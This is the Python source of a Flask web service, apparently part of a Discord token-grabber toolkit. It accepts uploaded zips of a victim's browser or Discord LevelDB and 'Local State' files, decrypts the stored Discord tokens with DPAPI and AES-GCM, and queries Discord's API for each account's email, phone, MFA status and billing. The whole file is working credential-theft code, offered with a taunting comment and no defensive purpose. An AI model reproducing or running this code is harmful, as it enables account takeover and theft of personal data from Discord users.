from flask import Flask, request, jsonify
import os
import tempfile
import zipfile
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from json import loads
from regex import findall
import requests
from datetime import datetime
# have fun skiding this, made sure everytime it mentions moscor in variable and func, and im happy. this will took you long enough lol
moscor_app = Flask(__name__)

def moscor_decrypt(moscor_buff, moscor_master_key):
    try:
        return AES.new(CryptUnprotectData(moscor_master_key, None, None, None, 0)[1], AES.MODE_GCM, moscor_buff[3:15]).decrypt(moscor_buff[15:])[:-16].decode()
    except Exception as moscor_e:
        return "An error has occurred.\n" + str(moscor_e)

class MoscorTokenInfoAPI:
    def __init__(self, moscor_token):
        self.moscor_token = moscor_token
        self.moscor_headers = {'Authorization': f'{self.moscor_token}'}

    def token_info(self):
        moscor_req = requests.get("https://discord.com/api/v8/users/@me", headers=self.moscor_headers)
        if moscor_req.status_code == 200:
            moscor_data = moscor_req.json()
            moscor_username = moscor_data['username'] + "#" + moscor_data['discriminator']
            moscor_userID = moscor_data['id']
            moscor_phone = moscor_data.get('phone', 'Not provided')
            moscor_email = moscor_data.get('email', 'Not provided')
            moscor_language = moscor_data['locale']
            moscor_mfa = moscor_data['mfa_enabled']
            moscor_avatar_id = moscor_data['avatar']
            moscor_nitro = False
            moscor_res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=self.moscor_headers)
            if moscor_res.status_code == 200:
                moscor_nitro_data = moscor_res.json()
                moscor_nitro = bool(len(moscor_nitro_data) > 0)
            moscor_avatar_url = f'https://cdn.discordapp.com/avatars/{moscor_userID}/{moscor_avatar_id}.webp'
            moscor_creation_date = datetime.utcfromtimestamp(((int(moscor_userID) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            return {"username": moscor_username, "userID": moscor_userID, "phone": moscor_phone, "email": moscor_email, "language": moscor_language, "mfa_enabled": moscor_mfa, "avatar_url": moscor_avatar_url, "creation_date": moscor_creation_date, "nitro": moscor_nitro}
        else:
            return None

@moscor_app.route('/decrypt', methods=['POST'])
def decrypt_token():
    if 'file' not in request.files:
        return jsonify({"error": "Please provide a zip file containing ldb, log, and Local State files."}), 400

    moscor_zip_file = request.files['file']

    with tempfile.TemporaryDirectory() as moscor_temp_dir:
        moscor_zip_path = os.path.join(moscor_temp_dir, 'upload.zip')
        moscor_zip_file.save(moscor_zip_path)

        with zipfile.ZipFile(moscor_zip_path, 'r') as moscor_zip_ref:
            moscor_zip_ref.extractall(moscor_temp_dir)

        moscor_key = None
        moscor_local_state_path = os.path.join(moscor_temp_dir, 'Local State')
        with open(moscor_local_state_path, 'r') as moscor_state_file:
            moscor_local_state_data = loads(moscor_state_file.read())
            moscor_key = moscor_local_state_data.get('os_crypt', {}).get('encrypted_key')

        if moscor_key is None:
            return jsonify({"error": "Could not find the encrypted key in the provided Local State file."}), 400

        moscor_decrypted_tokens = []
        for moscor_root, moscor_dirs, moscor_files in os.walk(moscor_temp_dir):
            for moscor_file in moscor_files:
                if moscor_file.endswith((".ldb", ".log")):
                    moscor_file_path = os.path.join(moscor_root, moscor_file)
                    try:
                        with open(moscor_file_path, 'r', errors='ignore') as moscor_file:
                            for moscor_line in moscor_file:
                                for moscor_token in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", moscor_line):
                                    moscor_decrypted_token = moscor_decrypt(b64decode(moscor_token.split('dQw4w9WgXcQ:')[1]), b64decode(moscor_key)[5:])
                                    moscor_decrypted_tokens.append(moscor_decrypted_token)
                    except PermissionError:
                        continue

        if not moscor_decrypted_tokens:
            return jsonify({"message": "No tokens found in the provided files."}), 200

        moscor_token_infos = []
        moscor_unique_tokens = set()

        for moscor_token in moscor_decrypted_tokens:
            moscor_handler = MoscorTokenInfoAPI(moscor_token)
            moscor_token_info = moscor_handler.token_info()
            if moscor_token_info:
                moscor_unique_key = (moscor_token_info["userID"], moscor_token_info["username"])
                if moscor_unique_key not in moscor_unique_tokens:
                    moscor_unique_tokens.add(moscor_unique_key)
                    moscor_token_infos.append(moscor_token_info)

        return jsonify({"tokens": moscor_token_infos}), 200

if __name__ == '__main__':
    moscor_app.run(debug=True)
